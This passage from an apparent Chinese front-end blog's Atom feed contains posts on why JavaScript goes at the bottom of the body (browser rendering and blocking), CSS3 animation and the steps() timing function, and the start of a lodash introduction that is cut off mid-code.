      &lt;p&gt;在网上看到一些不错的javascript编程题，于是我也想拿来练练手。这篇博客也将会不断更新。&lt;br&gt;&lt;img src=&quot;/2016/01/25/javascript-programming-question/jpq.jpg&quot; alt=&quot;jpq.jpg&quot; title=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="http://summerGreenTea.github.io/tags/javascript/"/>
    
      <category term="programming" scheme="http://summerGreenTea.github.io/tags/programming/"/>
    
  </entry>
  
  <entry>
    <title>为什么要把JS放在body底部？</title>
    <link href="http://summerGreenTea.github.io/2016/01/24/put-js-in-body-bottom/"/>
    <id>http://summerGreenTea.github.io/2016/01/24/put-js-in-body-bottom/</id>
    <published>2016-01-24T11:00:26.000Z</published>
    <updated>2016-03-02T03:03:59.247Z</updated>
    
    <content type="html">&lt;p&gt;在前端的”启蒙”时期就在Yahoo军规里面看到关于网页性能优化的这条军规，在实际的代码书写中，我也一直遵循着这条规则。但是在很长一段时间里，我却不知其真正所以然。每次看到这些页面优化法则的时候，附带的解释总是那么几句，心里总是要要打一个大大的问号。这篇博客，就是梳理我对这个问题的一些了解和思考。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前些天，在微博上看到了一篇关注度很高的文章&lt;a href=&quot;http://web.jobbole.com/84843/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;JS 一定要放在 Body 的最底部么？聊聊浏览器的渲染机制&lt;/a&gt;,让我联想到一系列在之前接触了解到的浏览器渲染机制和Javascript单线程的知识，刚好借看到的这篇文章的机会做个详细的梳理。&lt;/p&gt;
&lt;h2 id=&quot;浏览器的渲染机制&quot;&gt;&lt;a href=&quot;#浏览器的渲染机制&quot; class=&quot;headerlink&quot; title=&quot;浏览器的渲染机制&quot;&gt;&lt;/a&gt;浏览器的渲染机制&lt;/h2&gt;&lt;p&gt;我经常会看到一类面试题就是&lt;strong&gt;一个页面，从输入URL地址到页面被加载出来都发生了什么?&lt;/strong&gt;,事实上，关于这个问题，我觉得往小的说，其实就是浏览器的渲染机制，要从大的方面来说，还涉及到DNS寻址，http、TCP/IP协议、路由选择等计算机网络相关方面的知识，具体这里有一篇文章，讲的相当详细，&lt;a href=&quot;http://web.jobbole.com/83720/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;从输入 URL 到页面加载完成的过程中都发生了什么事情？&lt;/a&gt;，自认为自己还没达到能说破天际的水平，所以还是往小的来讲。&lt;/p&gt;
&lt;p&gt;先来看下浏览器的主要结构:&lt;br&gt;&lt;img src=&quot;/2016/01/24/put-js-in-body-bottom/layers.png&quot; alt=&quot;layers.png&quot; title=&quot;&quot;&gt;&lt;br&gt;User Interface : 包括地址栏，前进后退，书签菜单等窗口上除了网页显示区域以外的部分。&lt;br&gt;Boswer engine : 查询与操作渲染引擎的接口。&lt;br&gt;Rendering engine : 负责显示请求的内容。比如请求到HTML, 它会负责解析HTML 与 CSS 并将结果显示到窗口中。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;* Networking ：用于网络请求, 如HTTP请求。它包括平台无关的接口和各平台独立的实现。
* Javascript Interpreter ：用于解析执行JavaScript代码。
* Ui Backend : 绘制基础元件，如组合框与窗口。它提供平台无关的接口，内部使用操作系统的相应实现。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里借一张webkit的main flow图片来开个头：&lt;br&gt;&lt;img src=&quot;/2016/01/24/put-js-in-body-bottom/webkitflow.png&quot; alt=&quot;webkitflow.png&quot; title=&quot;&quot;&gt;&lt;br&gt;当服务器响应我们的请求并发回我们想要访问页面的HTML代码的时候，浏览器的work flow是:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;首先调用&lt;strong&gt;Rendering engine&lt;/strong&gt;的&lt;strong&gt;Ui Backend&lt;/strong&gt;去解析获得的HTML代码，这个时候浏览器如果发现HTML中有外部资源(比如css、js以及img)，就会调用&lt;strong&gt;Networking&lt;/strong&gt;并行向资源所在服务器发起HTTP请求来请求返回资源。当页面中所有的HTML代码都被解析完成后，就会生成&lt;strong&gt;DOM Tree&lt;/strong&gt;。这是一个树形的数据结构，而且DOM Tree的构建过程是一个深度遍历的过程。利用代码和图片表示下就为:&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			Hello World&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;example.png&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;将被转化为:&lt;br&gt;&lt;img src=&quot;/2016/01/24/put-js-in-body-bottom/dom-tree.png&quot; alt=&quot;dom-tree.png&quot; title=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;浏览器将请求的每个CSS文件下载好并生成一个&lt;strong&gt;StyleSheet object&lt;/strong&gt;，每个对象都包含若干个&lt;strong&gt;CSS Rule&lt;/strong&gt;，这些CSS Rule对象包含&lt;strong&gt;Selector&lt;/strong&gt;和&lt;strong&gt;Declaration object&lt;/strong&gt;，其他的对象就是CSS的语法。&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&quot;/2016/01/24/put-js-in-body-bottom/css-rule.png&quot; alt=&quot;css-rule.png&quot; title=&quot;&quot;&gt;
&lt;ul&gt;
&lt;li&gt;浏览器会将生成的DOM Tree和CSS Rule结合形成&lt;strong&gt;Render Tree&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&quot;/2016/01/24/put-js-in-body-bottom/dom-tree-and-css-rules.jpg&quot; alt=&quot;dom-tree-and-css-rules.jpg&quot; title=&quot;&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;接下浏览器要做的就是将生成的Render Tree渲染到我们的用户界面当中。这一步就是&lt;strong&gt;Layout&lt;/strong&gt;。浏览器会计算每个DOM节点上的位置信息，来确定节点在用户界面的位置(这个过程操作相对复杂、耗时，也是DOM操作缓慢的原因之一)。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;当浏览器知道相应节点的位置信息后，渲染引擎将Render Tree中的节点中的其他渲染规则应用到节点上。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当结束前面的步骤后，一个HTML页面就会被渲染出来。似乎已经全部讲完了，但整个过程却还没有那么简单的结束哦！&lt;/p&gt;
&lt;h2 id=&quot;Ui-Backend阻塞&quot;&gt;&lt;a href=&quot;#Ui-Backend阻塞&quot; class=&quot;headerlink&quot; title=&quot;Ui Backend阻塞&quot;&gt;&lt;/a&gt;Ui Backend阻塞&lt;/h2&gt;&lt;p&gt;我们在第一步的时候提到了，渲染引擎会在解析到有外部资源的HTML代码时，调用网络去发起HTTP请求。当请求的是Js文件并且Js文件下载完成后，会将Ui Backend(我理解为UI Thread)阻塞，并等待JS代码下载解析完成才唤醒Ui Backend。&lt;/p&gt;
&lt;p&gt;这个是因为Js不仅可以完成逻辑操作，还可以对DOM的操作来改变页面的内容，如果Ui Backend继续渲染，那么等到渲染完成后再执行Js,而这时的Js中有大量对DOM的操作的话，那么势必会造成大量的Repaint/Reflow。这种做法显然不太合适，所以浏览器选择去执行Rendering engine 中的Javascript Interpreter(我理解为Js Thread)，而阻塞Ui Backend，显然，用户需要等待更长的时间才能看到他们想要访问的页面。&lt;/p&gt;
&lt;p&gt;出于对这种情况的考虑，所以很多人建议把JS文件放在Body底部，这样就可以等到页面渲染完成后再执行JS。&lt;/p&gt;
&lt;h2 id=&quot;思考&quot;&gt;&lt;a href=&quot;#思考&quot; class=&quot;headerlink&quot; title=&quot;思考&quot;&gt;&lt;/a&gt;思考&lt;/h2&gt;&lt;p&gt;通过上面内容的了解，我们可以得出将JS文件放在页面底部的做法是非常可取的结论，那么在实际的工程项目运用是是否真的是如此呢？答案是否定的。&lt;/p&gt;
&lt;p&gt;思考一个应用场景，我们通常需要根据用户的浏览器版本以及用户打开页面第一时间的信息(当前的网络环境等等)来记录一些数据或处理一些兼容性问题。常见的有&lt;em&gt;html5shim.js&lt;/em&gt;等类库，需要处理兼容低版本浏览器，但是如果等到页面加载完成之后再加载这类文件的话，就会造成一些不知名的错误。但是通常来说，具体的项目环境，会有不同的使用规则。知乎上这个问题的&lt;a href=&quot;https://www.zhihu.com/question/34147508&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;金戈铁马的回答&lt;/a&gt;就很能说明这个问题。&lt;/p&gt;
&lt;p&gt;当然这是特殊的情况都有一个共同点，就是这些JS文件必须不能涉及到页面逻辑，也就是不能存在操作DOM代码。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;在前端的”启蒙”时期就在Yahoo军规里面看到关于网页性能优化的这条军规，在实际的代码书写中，我也一直遵循着这条规则。但是在很长一段时间里，我却不知其真正所以然。每次看到这些页面优化法则的时候，附带的解释总是那么几句，心里总是要要打一个大大的问号。这篇博客，就是梳理我对这个问题的一些了解和思考。&lt;br&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="http://summerGreenTea.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>梳理CSS3-animation的知识点</title>
    <link href="http://summerGreenTea.github.io/2015/12/28/css3-animation/"/>
    <id>http://summerGreenTea.github.io/2015/12/28/css3-animation/</id>
    <published>2015-12-28T03:27:04.000Z</published>
    <updated>2016-03-02T02:58:00.268Z</updated>
    
    <content type="html">&lt;p&gt;最初开始学习前端的时候，看懂CSS3的animation的实现的动画效果和编写animation动画代码的简洁名了，惊叹不已。转眼，学习前端已经有一年多的时间，使用CSS3动画也有段时间了，其中的知识点，也有必要做个梳理了。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;CSS3动画在现在的各种节日活动的业务中使用非常普遍，较好的体验效果和比较低的性能损耗让CSS3逐渐的取代了flash来完成一些复杂的动画效果，尤其是移动端，各大平台对CSS3动画的支持也让它成为主流的选择。&lt;br&gt;其实在CSS3中，我们可以通过translate和transform的组合来实现一些简单的动画的效果，但是对于应用场景比较复杂的动画效果，这种组合也就力不从心了。所以在我们在讲到CSS动画的时候大部分都是指CSS3的animation。这篇文章也是如此。&lt;/p&gt;
&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;简单的从w3c上面扒了下CSS3 animation的属性:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;animation-name&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;animation-duration&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;animation-delay&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;animation-iteration-count&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;animtion-direction&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;animation-play-state&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;animation-fill-mode&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;animation-timing-function&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;浏览器的支持程度:&lt;br&gt;&lt;img src=&quot;/2015/12/28/css3-animation/support.png&quot; alt=&quot;support.png&quot; title=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;使用&quot;&gt;&lt;a href=&quot;#使用&quot; class=&quot;headerlink&quot; title=&quot;使用&quot;&gt;&lt;/a&gt;使用&lt;/h3&gt;&lt;p&gt;上面列举的属性有些真的是太简单了，baid都有一大堆，就别google了，下面介绍的都是自己有时会用错的或者是有些需要注意使用的属性。&lt;br&gt;&lt;code&gt;animation-iteration-count&lt;/code&gt;是指定动画要执行的次数，可以给定一个大于0的正整数n,或者是infinite,表示无限次播放。&lt;br&gt;&lt;code&gt;animation-fill-mode&lt;/code&gt;是表示动画之外的状态。怎么理解呢？我个人的理解为就是动画执行完成之后的结束之后的状态，好吧，这么说还是有点绕口，通过各例子来说明下。&lt;/p&gt;
&lt;p&gt;查看效果: (在线查看)[&lt;a href=&quot;http://sandbox.runjs.cn/show/5lqxwwfn&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://sandbox.runjs.cn/show/5lqxwwfn&lt;/a&gt;]&lt;/p&gt;
&lt;p&gt;&lt;code&gt;animation-play-state&lt;/code&gt;是指定animation的执行状态的。它有两个可选值running和pause。它们分别表示动画的执行态和暂停态，默认是running。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;animation-timing-function&lt;/code&gt;是&lt;strong&gt;检索或设置&lt;/strong&gt;动画的过度类型，这是官方版的解释，简单的所就是动画执行的速率，这里面有什么ease、ease-in等等的，还可以指定三次贝塞尔曲线函数来作为值。&lt;/p&gt;
&lt;p&gt;animation根具所给定的值来决定动画在执行时间内的运动速率轨迹。这里值得一提是一个叫做steps(number, [start|end])的函数值。在W3CSchool的介绍文档里面并没有发现有这个值的介绍，但是在实际运用中，却发现了很多steps的运用场景，所以，这里重点提一下。&lt;br&gt;文档上称之为阶跃函数(stepping function)。step函数可以接受两个值来作为参数，第一个是一个数值(大于0的正整数)来指定在每个关键帧之间所发生的阶跃次数;第二个是一个可选值，指定的值可以是end或者start，分别表示在阶跃间隔的开始和结束发生阶跃变化。&lt;br&gt;这么说还是不太好理解，我们用代码来描述下:&lt;/p&gt;
&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-class&quot;&gt;.step&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;animation-name&lt;/span&gt;: step;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;animation-duration&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;10s&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;animation-timing-function&lt;/span&gt;: &lt;span class=&quot;built_in&quot;&gt;steps&lt;/span&gt;(3, end);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;animation-iteration-count&lt;/span&gt;: infinite;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;@&lt;span class=&quot;keyword&quot;&gt;keyframes&lt;/span&gt; step &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	0% &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;attribute&quot;&gt;background&lt;/span&gt;: red;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	100% &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;attribute&quot;&gt;background&lt;/span&gt;: black;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;效果查看: (查看效果)[&lt;a href=&quot;http://sandbox.runjs.cn/show/cstdcahv&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://sandbox.runjs.cn/show/cstdcahv&lt;/a&gt;]&lt;br&gt;我们发现动画帧的变化跳过了黑色的那个关键帧。如果把steps的第二个参数该为start,那么相应的显示为红色的那个关键帧也会被直接跳过不显示。&lt;/p&gt;
&lt;p&gt;我们用张W3C上的图来解释下上面出现结果的原因:&lt;/p&gt;
&lt;img src=&quot;/2015/12/28/css3-animation/step.png&quot; alt=&quot;step.png&quot; title=&quot;&quot;&gt;
&lt;p&gt;我们可以根据上面的实例代码总结出来,steps的第一个参数是把keyframes中指定的关键帧间又做了个切分，第二个参数是更具第一个参数对切分后的总关键帧数来做起点帧或终点帧的跳过。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;steps的第一个参数是作用于keysframe的两个关键帧之间的，而不是整个keyframes&lt;/strong&gt;&lt;br&gt;这点是个要认真注意的误区。&lt;br&gt;比如说，上面的代码中，我们给steps的第一个参数的值为3，那么step的keyframes就被划分为0%, 50%, 100%三个关键帧。如果上面的step的keyframes改为:&lt;/p&gt;
&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;@&lt;span class=&quot;keyword&quot;&gt;keyframes&lt;/span&gt; step &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	0% &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;attribute&quot;&gt;background&lt;/span&gt;: red;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	50% &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;attribute&quot;&gt;background&lt;/span&gt;: green;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	100% &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;attribute&quot;&gt;background&lt;/span&gt;: black;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;那么他的关键帧切分就为：0%, 25%, 50%, 75%, 100%。确保在keyframes中定义的两个关键帧之间切分后能表示为3个关键帧。&lt;/p&gt;
&lt;p&gt;animation-timing-function还可以指定为step-start或step-end，它们等同于steps(1, start)和steps(1, end);&lt;/p&gt;
&lt;h3 id=&quot;结语&quot;&gt;&lt;a href=&quot;#结语&quot; class=&quot;headerlink&quot; title=&quot;结语&quot;&gt;&lt;/a&gt;结语&lt;/h3&gt;&lt;p&gt;本来是想好好写下animation的一些知识点的，但是写完之后发现这篇文章感觉写的有点打酱油的味道了。但是还是作为一次小小的知识总结来写吧！虽说不够详细，但是也是个人对于一些基础知识点的把握程度来进行梳理，有些就一笔带过，有的就讲下自己的理解。&lt;br&gt;日后如果发现关于CSS3 animation的有趣的知识点的话，还是会再补充的。  ~~~完。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;最初开始学习前端的时候，看懂CSS3的animation的实现的动画效果和编写animation动画代码的简洁名了，惊叹不已。转眼，学习前端已经有一年多的时间，使用CSS3动画也有段时间了，其中的知识点，也有必要做个梳理了。&lt;br&gt;
    
    </summary>
    
    
      <category term="CSS3" scheme="http://summerGreenTea.github.io/tags/CSS3/"/>
    
      <category term="animation" scheme="http://summerGreenTea.github.io/tags/animation/"/>
    
  </entry>
  
  <entry>
    <title>javascript工具库-lodash.js</title>
    <link href="http://summerGreenTea.github.io/2015/12/25/lodash/"/>
    <id>http://summerGreenTea.github.io/2015/12/25/lodash/</id>
    <published>2015-12-25T12:54:39.000Z</published>
    <updated>2016-03-02T02:58:00.351Z</updated>
    
    <content type="html">&lt;p&gt;如果你曾经使用过&lt;strong&gt;underscore&lt;/strong&gt;,那么你一定会喜欢今天我要介绍的&lt;strong&gt;lodash&lt;/strong&gt;。&lt;br&gt;&lt;img src=&quot;/2015/12/25/lodash/lodash.png&quot; alt=&quot;lodash.png&quot; title=&quot;&quot;&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;lodash&lt;/strong&gt;起初是由&lt;strong&gt;underscore&lt;/strong&gt;演变而来的。因为与underscore的其他贡献者意见相斥，于是乎lodash的开发者就更具自己的理解，开发出lodash这个javascript工具库。&lt;/p&gt;
&lt;p&gt;于underscore一样，lodash也沿用了 _ 作为全局访问对象来对工具库函数api的快速访问。&lt;/p&gt;
&lt;p&gt;最新版的lodash是4.0版本，比较重要的改变是这个版本也是不再对IE6-8的支持，相关的信息可以&lt;a href=&quot;https://github.com/lodash/lodash/wiki/Changelog&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;点击查看&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;对比&quot;&gt;&lt;a href=&quot;#对比&quot; class=&quot;headerlink&quot; title=&quot;对比&quot;&gt;&lt;/a&gt;对比&lt;/h2&gt;&lt;p&gt;想对比与underscore，lodash的带给我的惊喜可不止是一点点。&lt;/p&gt;
&lt;h3 id=&quot;API文档&quot;&gt;&lt;a href=&quot;#API文档&quot; class=&quot;headerlink&quot; title=&quot;API文档&quot;&gt;&lt;/a&gt;API文档&lt;/h3&gt;&lt;p&gt;早些时候，当我发现lodash这个工具库的之前，我还是一直使用underscore作为必备首选。但是当我查看了lodash的文档和官方介绍后，毅然的决定抛弃underscore。&lt;/p&gt;
&lt;p&gt;单方面的个人感受，当我查看相关api文档时，lodash的文档着实详细易看。参数的类型描述、返回结果的类型和给的示例都非常详细，对比与我这个写代码几乎不写注释的人来说，结结实实的打脸啊。&lt;/p&gt;
&lt;h3 id=&quot;延迟计算&quot;&gt;&lt;a href=&quot;#延迟计算&quot; class=&quot;headerlink&quot; title=&quot;延迟计算&quot;&gt;&lt;/a&gt;延迟计算&lt;/h3&gt;&lt;p&gt;lodash的执行效率则是最受好评的一个点。lodash的作者也提到了，lodash的最初目标是提供更多的”一致的跨浏览器的行为，并改善性能”。lodash采用的延迟计算的策略，具体是怎么个实现方式呢，我们俩看一段代码:&lt;/p&gt;
&lt;figure class=&quot;highlight qml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;priceLt&lt;/span&gt;(&lt;span 